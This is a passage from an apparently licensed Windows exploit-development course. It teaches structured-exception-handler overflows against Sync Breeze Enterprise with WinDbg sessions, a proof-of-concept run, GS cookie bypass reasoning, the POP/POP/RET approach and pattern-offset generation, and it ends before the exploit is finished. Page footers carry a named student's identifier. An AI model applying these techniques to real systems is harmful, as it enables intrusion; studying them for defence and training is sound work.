list of _EXCEPTION_REGISTRATION_RECORD structures, performing various checks before 
calling the exception_handler function pointed to by each Handler member. This continues until a 
handler is found that will successfully process the exception and allow execution to continue. If 
no handler can successfully handle the exception, the application will crash. 
In the next sections we’ll leverage the theory we have learned in order to gain remote code 
execution on our target application. 
4.4.2.1 Exercises 
1. 
Inside WinDbg, review the structures we discussed in this section. Review the structures’ 
members and understand how they are used by the exception handler. 
2. 
Review and understand the pseudo-code in this section. 
4.5 Structured Exception Handler Overflows 
In this section, we’ll leverage what we’ve learned about the Structured Exception Handling 
mechanism to gain control over the execution flow of our vulnerable application and execute our 
desired payload. 
A structure exception overflow is a stack buffer overflow that is either large enough or positioned 
in such a way to overwrite valid registered exception handlers on the stack. By overwriting one or 
more of these handlers, the attacker can take control of the instruction pointer after triggering an 
exception. 
In most cases, an overflow tends to overwrite valid pointers and structures on the stack, which 
often generates an access violation exception. If this does not occur, an attacker can often force 
an exception by increasing the size of the overflow. 
With the increase in stack overflows Microsoft included a stack overflow 
mitigation named GS109 which is enabled by default in modern versions of Visual 
Studio. At a high level, when a binary that is compiled with the /GS flag is loaded 
a random stack cookie seed110 value is initialized and stored in the .data section 
of the binary. When a function protected by GS is called, an XOR operation takes 
place between the stack cookie seed value and the EBP register. The result of 
this operation is stored on the stack prior to the return address. 
Before returning out of the protected function, another XOR operation occurs 
between the previous value saved on the stack and the EBP register. This result 
is then checked with the stack cookie seed value from the .data section. If the 
 
109 (Microsoft - /GS (Buffer Security Checks)), https://docs.microsoft.com/en-us/cpp/build/reference/gs-buffer-security-
check?view=msvc-160&viewFallbackFrom=msvc-160 
110 (A Modern Exploration of Windows Memory Corruption Exploits - Part I: Stack Overflows), https://www.forrest-orr.net/post/a-
modern-exploration-of-windows-memory-corruption-exploits-part-i-stack-overflows 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
103 
values do not match the application will throw an exception and terminate the 
execution. 
Overwriting an exception handler and causing the application to crash in any way 
triggers the SEH mechanism and causes the instruction pointer to be redirected 
to the address of the exception_handler prior to reaching the end of the 
vulnerable function. Because of this increasing the size of a stack overflow and 
overwriting a _EXCEPTION_REGISTRATION_RECORD can allow an attacker to 
bypass stack cookies. 
As 
we 
previously 
discussed 
(and 
is 
again 
shown 
in 
Figure 
28 
below), 
the 
_EXCEPTION_REGISTRATION_RECORD structures are stored at the beginning of the stack space. 
Because the stack grows backwards, the overflow will need to be quite large or begin towards the 
beginning of the stack in order for the attacker to overwrite a structured exception handler. 
 
Figure 28: SEH mechanism in action 
Let’s try confirming the theory we explored earlier about structured exception handlers, as well as 
the consequences of overwriting them. We’ll restart our application from the Services utility and 
re-attach the debugger to it. 
Before sending the initial proof of concept, we want to inspect an intact chain of 
_EXCEPTION_REGISTRATION_RECORD structures to observe them in memory. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
104 
Because the SEH mechanism works on a per-thread basis, we won’t be able to inspect the intact 
SEH chain for the thread handling our incoming data, as that thread has not yet spawned. Instead, 
we will inspect the chain of _EXCEPTION_REGISTRATION_RECORD structures for the thread 
WinDbg breaks into when we attach the debugger to the target process. This will reveal an intact 
chain. 
After attaching the WinDbg to our process, we’ll obtain the TEB address with !teb,111 which will 
contain the ExceptionList pointer: 
0:007> !teb 
TEB at 7ffd8000 
    ExceptionList:        0132ff70 
    StackBase:            01330000 
    StackLimit:           0132c000 
    SubSystemTib:         00000000 
    FiberData:            00001e00 
    ArbitraryUserPointer: 00000000 
    Self:                 7ffd8000 
    EnvironmentPointer:   00000000 
    ClientId:             000004d4 . 00000c8c 
    RpcHandle:            00000000 
    Tls Storage:          00000000 
    PEB Address:          7ffd7000 
    LastErrorValue:       0 
    LastStatusValue:      0 
    Count Owned Locks:    0 
    HardErrorMode:        0 
Listing 100 - Dumping the TEB in WinDbg 
Listing 100 shows that, as expected, the ExceptionList starts very close to the beginning of the 
StackBase. 
In x86 architecture, the stack is “head down”, meaning that it starts at a higher 
memory address and expands down to a lower address. 
Next, we’ll dump the first _EXCEPTION_REGISTRATION_RECORD structure at the memory 
address specified in the ExceptionList member. 
From the previous section, we know that the _EXCEPTION_REGISTRATION_RECORD structure 
has two members. The first is Next and, as the name suggests, it points to the next entry in the 
singly-linked list. The second, Handler, is the memory address of the _except_handler function. We 
can manually walk the singly-linked list in the debugger as shown in the listing below. 
0:007> dt _EXCEPTION_REGISTRATION_RECORD 0132ff70 
ntdll!_EXCEPTION_REGISTRATION_RECORD 
   +0x000 Next             : 0x0132ffcc _EXCEPTION_REGISTRATION_RECORD 
   +0x004 Handler          : 0x7728a380     _EXCEPTION_DISPOSITION  
ntdll!_except_handler4+0 
 
111 (WinDBG - Thread related information), http://windbg.info/doc/1-common-cmds.html#12_thread 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
105 
    
0:007> dt _EXCEPTION_REGISTRATION_RECORD 0x0132ffcc 
ntdll!_EXCEPTION_REGISTRATION_RECORD 
   +0x000 Next             : 0x0132ffe4 _EXCEPTION_REGISTRATION_RECORD 
   +0x004 Handler          : 0x7728a380     _EXCEPTION_DISPOSITION  
ntdll!_except_handler4+0 
    
0:007> dt _EXCEPTION_REGISTRATION_RECORD 0x0132ffe4 
ntdll!_EXCEPTION_REGISTRATION_RECORD 
   +0x000 Next             : 0xffffffff _EXCEPTION_REGISTRATION_RECORD 
   +0x004 Handler          : 0x77296c7c     _EXCEPTION_DISPOSITION  
ntdll!FinalExceptionHandlerPad12+0 
Listing 101 - Walking the structured exception handling chain in WinDbg 
As highlighted in Listing 101, the end of the singly-linked list is marked by the 0xffffffff value 
stored by the last _EXCEPTION_REGISTRATION_RECORD Next member. This last record is the 
default exception handler specified by the operating system. 
To understand what is happening during an SEH overflow, we’ll let our application continue 
execution inside the debugger and send our previous proof of concept, once again triggering an 
access violation. 
kali@kali:~$ python3 seh_overflow_0x01.py 192.168.120.10 
Sending evil buffer... 
Done! 
Listing 102 - Re-running the initial proof of concept 
This time, when we attempt to walk the ExceptionList, we notice that the second 
_EXCEPTION_REGISTRATION_RECORD structure has been overwritten by our malicious buffer. 
(ed8.192c): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze 
Enterprise\bin\libpal.dll 
eax=41414141 ebx=01c4fa1c ecx=01c4ff18 edx=01c4f9d4 esi=01c4ff18 edi=01c4fb20 
eip=00ac2a9d esp=01c4f9a8 ebp=01c4fec8 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206 
libpal!SCA_ConfigObj::Deserialize+0x1d: 
00ac2a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=???????? 
 
0:011> !teb 
TEB at 0026b000 
    ExceptionList:        01c4fe1c 
    StackBase:            01c50000 
    StackLimit:           01c4f000 
    SubSystemTib:         00000000 
    FiberData:            00001e00 
    ArbitraryUserPointer: 00000000 
    Self:                 0026b000 
    EnvironmentPointer:   00000000 
    ClientId:             00000ed8 . 0000192c 
    RpcHandle:            00000000 
    Tls Storage:          0054fa80 
    PEB Address:          0025d000 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
106 
    LastErrorValue:       0 
    LastStatusValue:      c000000d 
    Count Owned Locks:    0 
    HardErrorMode:        0 
 
0:011> dt _EXCEPTION_REGISTRATION_RECORD 01c4fe1c 
ntdll!_EXCEPTION_REGISTRATION_RECORD 
   +0x000 Next             : 0x01c4ff54 _EXCEPTION_REGISTRATION_RECORD 
   +0x004 Handler          : 0x00b3df5b     _EXCEPTION_DISPOSITION  
libpal!md5_starts+0 
 
0:011> dt _EXCEPTION_REGISTRATION_RECORD 0x01c4ff54 
ntdll!_EXCEPTION_REGISTRATION_RECORD 
   +0x000 Next             : 0x41414141 _EXCEPTION_REGISTRATION_RECORD 
   +0x004 Handler          : 0x41414141     _EXCEPTION_DISPOSITION  +41414141 
Listing 103 - Walking the structured exception handler chain after the crash in WinDbg 
_EXCEPTION_REGISTRATION_RECORD structures are pushed on the stack from 
first to last. Because of this, SEH overflows generally overwrite the last 
_EXCEPTION_REGISTRATION_RECORD structure first. Depending on the length 
of the overflow, it is possible to overwrite more than one 
_EXCEPTION_REGISTRATION_RECORD structure. 
Keep in mind that in some cases, the overflow happens in such a way that the 
exception chain is only partially overwritten. 
In our case, the exception occurs because the application is trying to read and execute from an 
unmapped memory page. This causes an access violation exception that needs to be handled by 
either the application or the operating system. 
WinDbg allows us to automatically list the current thread exception handler chain with !exchain.112 
The !exchain extension displays the exception handlers of the current thread. It supports three 
arguments that can be used to gather information on specific types of exceptions, such as C++ 
try/catch exceptions. By default, it displays the exception handler implemented using the SEH 
mechanism. 
0:011> !exchain 
01c4fe1c: libpal!md5_starts+149fb (00b3df5b) 
01c4ff54: 41414141 
Invalid exception stack at 41414141 
Listing 104 - Inspecting the exception handler chain at the moment of the crash 
The output from !exchain provides us with the same information as our previous manual SEH 
chain dump. 
Reiterating our theory discussion, we know that the first step in the SEH mechanism is to obtain 
the address of the first _EXCEPTION_REGISTRATION_RECORD structure from the TEB. The 
 
112 (WinDBG !exchain), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-exchain 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
107 
operating system then proceeds to call each _except_handler function until the exception is 
properly handled, or it simply crashes the process if no handler could successfully deal with the 
exception. 
At this point, however, the address of at least one of the _except_handler functions has been 
overwritten 
by 
our 
buffer 
(0x41414141). 
This 
means 
that 
whenever 
this 
_EXCEPTION_REGISTRATION_RECORD structure is used to handle the exception, the CPU will 
end up calling 0x41414141, giving us control over the EIP register. This is exactly the behavior we 
noticed as part of the initial crash analysis. 
We can once again confirm this by resuming execution in WinDbg and letting the application 
attempt to handle the exception: 
0:011> g 
(ed8.192c): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=00000000 ebx=00000000 ecx=41414141 edx=77383b20 esi=00000000 edi=00000000 
eip=41414141 esp=01c4f438 ebp=01c4f458 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 
41414141 ??              ??? 
Listing 105 - Letting the exception be handled by WinDbg 
The above listing reveals that the instruction pointer is under control. Let’s inspect the callstack 
(k) to determine which functions were called before the EIP register was overwritten. 
0:011> k 
 # ChildEBP RetAddr   
WARNING: Frame IP not in any known module. Following frames may be wrong. 
00 01c4f434 77383b02 0x41414141 
01 01c4f458 77383ad4 ntdll!ExecuteHandler2+0x26 
02 01c4f528 77371586 ntdll!ExecuteHandler+0x24 
03 01c4f528 00ac2a9d ntdll!KiUserExceptionDispatcher+0x26 
04 01c4fec8 00000000 libpal!SCA_ConfigObj::Deserialize+0x1d 
Listing 106 - Dumping the callstack in WinDbg after the exception is handled 
The output indicates that ntdll!ExecuteHandler2 was called directly before we achieved code 
execution. As previously discussed, this function is responsible for calling the _except_handler 
functions registered on the stack. We’ll confirm this shortly. 
We can list all the registers within WinDbg to determine if any of them point to our buffer: 
0:011> r 
eax=00000000 ebx=00000000 ecx=41414141 edx=77383b20 esi=00000000 edi=00000000 
eip=41414141 esp=01c4f438 ebp=01c4f458 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 
41414141 ??              ??? 
 
0:011> dds esp La 
01c4f438  77383b02 ntdll!ExecuteHandler2+0x26 
01c4f43c  01c4f540 
01c4f440  01c4ff54 
01c4f444  01c4f55c 
01c4f448  01c4f4cc 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
108 
01c4f44c  01c4fe1c 
01c4f450  77383b20 ntdll!ExecuteHandler2+0x44 
01c4f454  01c4ff54 
01c4f458  01c4f528 
01c4f45c  77383ad4 ntdll!ExecuteHandler+0x24 
 
0:011> u edx 
ntdll!ExecuteHandler2+0x44: 
77383b20 8b4c2404        mov     ecx,dword ptr [esp+4] 
77383b24 f7410406000000  test    dword ptr [ecx+4],6 
77383b2b b801000000      mov     eax,1 
77383b30 7512            jne     ntdll!ExecuteHandler2+0x68 (77383b44) 
77383b32 8b4c2408        mov     ecx,dword ptr [esp+8] 
77383b36 8b542410        mov     edx,dword ptr [esp+10h] 
77383b3a 8b4108          mov     eax,dword ptr [ecx+8] 
77383b3d 8902            mov     dword ptr [edx],eax 
Listing 107 - Dumping the registers in WinDbg after the exception is handled 
According to the output in Listing 107, none of the registers point to our buffer at the moment we 
gain control over the execution. The ECX register is being overwritten alongside the instruction 
pointer while most of the other registers are NULL. We do not overwrite any data on the stack 
(which ESP and EBP point to). Lastly, EDX appears to point somewhere inside the 
ntdll!ExecuteHandler2 function. 
At this point, even if we control the instruction pointer, we are still not able to easily redirect the 
execution flow to our buffer where we’d eventually store a payload. 
To better understand the SEH mechanism we can restart Sync Breeze and set a breakpoint at the 
ntdll!ExecuteHandler2 function to stop the execution before WinDbg intercepts the exception. 
From the previous debugging session, we know that when the access violation is triggered, the 
first entry in ExceptionList is not overwritten by our buffer and therefore is still a valid 
_EXCEPTION_REGISTRATION_RECORD structure. Our overflow only affects the following 
_EXCEPTION_REGISTRATION_RECORD structure in the linked list. Because of this, when the SEH 
mechanism tries to handle the exception, ntdll!ExecuteHandler2 will be called twice. 
Initially, it will use the first _EXCEPTION_REGISTRATION_RECORD structure (which is still intact) 
and then proceed to use the corrupted structure. When the breakpoint is first triggered, we will 
simply let execution resume: 
(1544.16f0): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze 
Enterprise\bin\libpal.dll 
eax=41414141 ebx=018efa1c ecx=018eff18 edx=018ef9d4 esi=018eff18 edi=018efb20 
eip=00902a9d esp=018ef9a8 ebp=018efec8 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206 
libpal!SCA_ConfigObj::Deserialize+0x1d: 
00902a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=???????? 
 
0:008> bp ntdll!ExecuteHandler2 
 
0:008> g 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
109 
Breakpoint 0 hit 
eax=00000000 ebx=00000000 ecx=018ef4cc edx=770a3b20 esi=00000000 edi=00000000 
eip=770a3adc esp=018ef45c ebp=018ef528 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
ntdll!ExecuteHandler2: 
770a3adc 55              push    ebp 
 
0:008> g 
Breakpoint 0 hit 
eax=00000000 ebx=00000000 ecx=018ef4cc edx=770a3b20 esi=00000000 edi=00000000 
eip=770a3adc esp=018ef45c ebp=018ef528 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
ntdll!ExecuteHandler2: 
770a3adc 55              push    ebp 
Listing 108 - Setting and hitting the breakpoint at the ntdll!ExecuteHandler2 function 
After hitting our breakpoint the second time, we’ll inspect the assembly code of the executing 
function: 
0:008> u @eip L11 
ntdll!ExecuteHandler2: 
770a3adc 55              push    ebp 
770a3add 8bec            mov     ebp,esp 
770a3adf ff750c          push    dword ptr [ebp+0Ch] 
770a3ae2 52              push    edx 
770a3ae3 64ff3500000000  push    dword ptr fs:[0] 
770a3aea 64892500000000  mov     dword ptr fs:[0],esp 
770a3af1 ff7514          push    dword ptr [ebp+14h] 
770a3af4 ff7510          push    dword ptr [ebp+10h] 
770a3af7 ff750c          push    dword ptr [ebp+0Ch] 
770a3afa ff7508          push    dword ptr [ebp+8] 
770a3afd 8b4d18          mov     ecx,dword ptr [ebp+18h] 
770a3b00 ffd1            call    ecx 
770a3b02 648b2500000000  mov     esp,dword ptr fs:[0] 
770a3b09 648f0500000000  pop     dword ptr fs:[0] 
770a3b10 8be5            mov     esp,ebp 
770a3b12 5d              pop     ebp 
770a3b13 c21400          ret     14h 
Listing 109 - Disassembly of the ntdll!ExecuteHandler2 function 
The first thing worth mentioning in this code (Listing 109) is that we are about to invoke a 
function by executing a “call ecx” instruction. According to the call stack (shown in Listing 108), 
this should call the overwritten _except_handler function (0x41414141). 
Additionally, this function accepts four arguments as inferred from the four PUSH instructions 
preceding the “call ecx”. This matches the _except_handler function prototype, which is repeated 
below for reference: 
typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (   
    IN PEXCEPTION_RECORD ExceptionRecord,   
    IN VOID EstablisherFrame, 
    IN OUT PCONTEXT ContextRecord,  
    IN OUT PDISPATCHER_CONTEXT DispatcherContext   
);  
Listing 110 - Prototype for the _exception_handler function 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
110 
Before verifying that the “call ecx” instruction will indeed invoke our _except_handler function, let’s 
inspect the beginning of the ntdll!ExecuteHandler2 function. 
We start by saving the EBP register on the stack and moving the stack pointer to EBP in order to 
easily access the arguments passed to the ntdll!ExecuteHandler2 function. 
This is followed by three PUSH instructions. Let’s single-step through each of them inside the 
debugger in order to better understand what is happening: 
0:008> t 
eax=00000000 ebx=00000000 ecx=018ef4cc edx=770a3b20 esi=00000000 edi=00000000 
eip=770a3adf esp=018ef458 ebp=018ef458 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
ntdll!ExecuteHandler2+0x3: 
770a3adf ff750c          push    dword ptr [ebp+0Ch]  ss:0023:018ef464=018eff54 
 
0:008> !teb 
TEB at 003c4000 
    ExceptionList:        018efe1c 
    StackBase:            018f0000 
    StackLimit:           018ee000 
... 
 
0:008> dt _EXCEPTION_REGISTRATION_RECORD 018efe1c 
ntdll!_EXCEPTION_REGISTRATION_RECORD 
   +0x000 Next             : 0x018eff54 _EXCEPTION_REGISTRATION_RECORD 
   +0x004 Handler          : 0x0097df5b     _EXCEPTION_DISPOSITION  
libpal!md5_starts+0 
Listing 111 - Single stepping through the first PUSH instruction from ntdll!ExecuteHandler2 
The debugger output indicates that the first PUSH instruction is responsible for pushing the Next 
member of the first _EXCEPTION_REGISTRATION_RECORD structure on the stack. 
0:008> t 
eax=00000000 ebx=00000000 ecx=018ef4cc edx=770a3b20 esi=00000000 edi=00000000 
eip=770a3ae2 esp=018ef454 ebp=018ef458 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
ntdll!ExecuteHandler2+0x6: 
770a3ae2 52              push    edx 
 
0:008> u @edx 
ntdll!ExecuteHandler2+0x44: 
770a3b20 8b4c2404        mov     ecx,dword ptr [esp+4] 
770a3b24 f7410406000000  test    dword ptr [ecx+4],6 
770a3b2b b801000000      mov     eax,1 
770a3b30 7512            jne     ntdll!ExecuteHandler2+0x68 (770a3b44) 
770a3b32 8b4c2408        mov     ecx,dword ptr [esp+8] 
770a3b36 8b542410        mov     edx,dword ptr [esp+10h] 
770a3b3a 8b4108          mov     eax,dword ptr [ecx+8] 
770a3b3d 8902            mov     dword ptr [edx],eax 
Listing 112 - Single stepping through the second PUSH instruction from ntdll!ExecuteHandler2 
The second PUSH instruction appears to place an offset into the ntdll!ExecuteHandler2 function 
on the stack: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
111 
0:008> t 
eax=00000000 ebx=00000000 ecx=018ef4cc edx=770a3b20 esi=00000000 edi=00000000 
eip=770a3ae3 esp=018ef450 ebp=018ef458 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
ntdll!ExecuteHandler2+0x7: 
770a3ae3 64ff3500000000  push    dword ptr fs:[0]     fs:003b:00000000=018efe1c 
 
0:008> !teb 
TEB at 003c4000 
    ExceptionList:        018efe1c 
    StackBase:            018f0000 
    StackLimit:           018ee000 
Listing 113 - Single stepping through the third PUSH instruction from ntdll!ExecuteHandler2 
Finally, we reach the third PUSH instruction. Listing 113 shows that we are pushing the current 
thread ExceptionList onto the stack. 
This is followed by a “mov dword ptr fs:[0],esp” instruction, which will overwrite the current thread 
ExceptionList with the value of ESP as shown below: 
0:008> t 
eax=00000000 ebx=00000000 ecx=018ef4cc edx=770a3b20 esi=00000000 edi=00000000 
eip=770a3aea esp=018ef44c ebp=018ef458 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
ntdll!ExecuteHandler2+0xe: 
770a3aea 64892500000000  mov     dword ptr fs:[0],esp fs:003b:00000000=018efe1c 
 
0:008> !teb 
TEB at 003c4000 
    ExceptionList:        018efe1c 
    StackBase:            018f0000 
    StackLimit:           018ee000 
... 
 
0:008> t 
eax=00000000 ebx=00000000 ecx=018ef4cc edx=770a3b20 esi=00000000 edi=00000000 
eip=770a3af1 esp=018ef44c ebp=018ef458 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
ntdll!ExecuteHandler2+0x15: 
770a3af1 ff7514          push    dword ptr [ebp+14h]  ss:0023:018ef46c=018ef4cc 
 
0:008> !teb 
TEB at 003c4000 
    ExceptionList:        018ef44c 
    StackBase:            018f0000 
    StackLimit:           018ee000 
... 
 
0:008> dt _EXCEPTION_REGISTRATION_RECORD 018ef44c 
ntdll!_EXCEPTION_REGISTRATION_RECORD 
   +0x000 Next             : 0x018efe1c _EXCEPTION_REGISTRATION_RECORD 
   +0x004 Handler          : 0x770a3b20     _EXCEPTION_DISPOSITION  
ntdll!ExecuteHandler2+0 
Listing 114 - Overwriting the ExceptionList 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
112 
The debugger output from Listing 114 confirms this. 
Essentially, before pushing the parameters required for the _except_handler function and calling it, 
the operating system updates ExceptionList with a new _EXCEPTION_REGISTRATION_RECORD 
structure. This new _EXCEPTION_REGISTRATION_RECORD is responsible for handling 
exceptions that might occur during the call to _except_handler. The function used to handle these 
exceptions is placed in EDX before the call to ntdll!ExecuteHandler2. 
The operating system leverages various exception handlers depending on the 
function that is used to invoke the _except_handler. In our case, the handler 
located at 0x770a3b20 is used to deal with exceptions that might occur during 
the execution of RtlpExecuteHandlerForException. 
After the execution of _except_handler (“call ecx”), the operating system restores 
the original ExceptionList by removing the previously added 
_EXCEPTION_REGISTRATION_RECORD. This is done by executing the two 
instructions “mov esp,dword ptr fs:[0]” and “pop dword ptr fs:[0]”. 
We can now proceed to single-step the remaining instructions and stop at “call ecx” to inspect the 
address we are about to redirect the execution flow to: 
0:008> t 
eax=00000000 ebx=00000000 ecx=018ef4cc edx=770a3b20 esi=00000000 edi=00000000 
eip=770a3afd esp=018ef43c ebp=018ef458 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
ntdll!ExecuteHandler2+0x21: 
770a3afd 8b4d18          mov     ecx,dword ptr [ebp+18h] ss:0023:018ef470=41414141 
 
0:008> t 
eax=00000000 ebx=00000000 ecx=41414141 edx=770a3b20 esi=00000000 edi=00000000 
eip=770a3b00 esp=018ef43c ebp=018ef458 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
ntdll!ExecuteHandler2+0x24: 
770a3b00 ffd1            call    ecx {41414141} 
Listing 115 - Single-stepping until the CALL ECX instruction inside the ntdll!ExecuteHandler2 function 
Nice. The output from Listing 115 confirms that we have successfully identified the assembly 
code that ultimately calls the _except_handler function, giving us control over the instruction 
pointer. 
At this point, we’ve applied the theory behind the SEH mechanism to our vulnerability. While not 
immediately apparent, this will eventually be extremely helpful. 
4.5.1.1 Exercises 
1. 
Inside WinDbg, review the structured exception handlers used by the vulnerable application 
before running the proof of concept. 
2. 
Run the proof of concept and repeat the previous exercise to confirm that one of the 
structured exception handlers is overwritten. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
113 
3. 
After WinDbg catches the access violation, let the debugger continue, and once the 
instruction pointer is pointing to the malicious buffer, try to determine which function was 
called before you gained control of EIP. 
4. 
Inside WinDbg, try to reach the last valid instruction before we gain control of the instruction 
pointer.  
4.5.2 Gaining Code Execution 
Now that we have a good understanding of how to leverage the SEH mechanism to gain control 
over the instruction pointer, let’s develop this into a fully working exploit. 
During a vanilla stack overflow, the attacker overwrites a return address, and consequently the 
EIP register, with the address of an instruction (like “jmp esp”) that can redirect the execution flow 
to the stack, where a payload is stored. 
As shown in Listing 116, this is impossible in our scenario because we do not control the stack 
when we gain control of the instruction pointer. 
0:007> r 
eax=00000000 ebx=00000000 ecx=41414141 edx=77f16b30 esi=00000000 edi=00000000 
eip=77f16b10 esp=013ff33c ebp=013ff358 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
ntdll!ExecuteHandler2+0x24: 
77f16b10 ffd1            call    ecx {41414141} 
 
0:007> dds esp L6 
013ff33c  013ff440 
013ff340  013fff54 
013ff344  013ff45c 
013ff348  013ff3cc 
013ff34c  013ffe1c 
013ff350  77f16b30 ntdll!ExecuteHandler2+0x44 
Listing 116 - Showing that we do not control the stack before the call to our 0x41414141 DWORD 
Based on our analysis of the SEH mechanism, we know that the moment our fake handler 
function is called, the stack will contain the return address followed by the four _except_handler 
arguments. 
typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (   
    IN PEXCEPTION_RECORD ExceptionRecord,   
    IN VOID EstablisherFrame, 
    IN OUT PCONTEXT ContextRecord,  
    IN OUT PDISPATCHER_CONTEXT DispatcherContext   
);  
Listing 117 - Prototype for the _exception_handler function 
What interests us is the second argument (EstablisherFrame), which is a pointer to the 
_EXCEPTION_REGISTRATION_RECORD structure used to handle the exception. We can confirm 
this with WinDbg, as shown below: 
0:007> dt _EXCEPTION_REGISTRATION_RECORD 013fff54 
ntdll!_EXCEPTION_REGISTRATION_RECORD 
   +0x000 Next             : 0x41414141 _EXCEPTION_REGISTRATION_RECORD 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
114 
   +0x004 Handler          : 0x41414141     _EXCEPTION_DISPOSITION  +41414141 
    
0:007> dd 013fff54 
013fff54  41414141 41414141 41414141 41414141 
013fff64  41414141 41414141 41414141 41414141 
013fff74  41414141 41414141 41414141 41414141 
013fff84  41414141 41414141 41414141 41414141 
013fff94  41414141 41414141 41414141 41414141 
013fffa4  41414141 41414141 41414141 41414141 
013fffb4  41414141 41414141 41414141 41414141 
013fffc4  41414141 41414141 41414141 41414141 
Listing 118 - Inspecting the EstablisherFrame argument in WinDbg 
According to the output from Listing 118, the second argument (EstablisherFrame) passed to the 
handler function points to our controlled data on the stack. This is good news as this is the same 
buffer that overwrites the _EXCEPTION_REGISTRATION_RECORD structure. 
This means that in order to redirect the execution flow to our buffer, we could overwrite the 
exception handler with the address of an instruction that returns into the EstablisherFrame 
address on the stack. 
The most common sequence of instructions used in SEH overflows to accomplish this task is 
“POP R32, POP R32, RET”, in which we POP the return address and the ExceptionRecord argument 
from the stack into two arbitrary registers (R32) and then execute a RET operation to return into 
the EstablisherFrame. 
Before searching for a POP, POP, RET (P/P/R) instruction sequence, we need to determine the 
exact offset required to precisely overwrite the exception handler on the stack. 
We’ll start by using msf-pattern_create to generate a unique pattern with a length of 1000 
bytes. This matches the input buffer size from our initial proof of concept that triggered the crash. 
kali@kali:~$ msf-pattern_create -l 1000  
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac
8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6A
f7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5
Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak 
... 
